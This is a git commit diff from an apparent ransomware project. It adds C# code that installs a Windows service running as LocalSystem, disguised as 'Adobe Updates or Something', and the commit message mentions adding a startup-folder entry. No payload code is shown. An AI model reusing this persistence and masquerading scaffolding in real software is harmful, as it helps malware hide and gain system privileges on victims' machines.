4603e4c06db52264dda0a808011ae631aab64526
SN1CK3T <47250557+SN1CK3T@users.noreply.github.com>
2021-01-08 12:08:02 -0500

    code will now add file to startup folder and repo now contains source code. The .exe has not been updated in this version

---
+++ project code - ransomware/LegitUpdates/Program.cs
@@ -0,0 +1,34 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using Topshelf;
+
+namespace LegitUpdates
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            var exitCode = HostFactory.Run(x =>
+            {
+                x.Service<Updates>(s =>
+                {
+                    s.ConstructUsing(update => new Updates());
+                    s.WhenStarted(update => update.Start());
+                    s.WhenStopped(update => update.Stop());
+                });
+
+                x.RunAsLocalSystem();
+
+                x.SetServiceName("LegitUpdates");
+                x.SetDisplayName("Adobe Updates or Something");
+                x.SetDescription("This is totally not malware");
+            });
+
+            int exitCodeValue = (int)Convert.ChangeType(exitCode, exitCode.GetTypeCode());
+            Environment.ExitCode = exitCodeValue;
+        }
+    }
+}
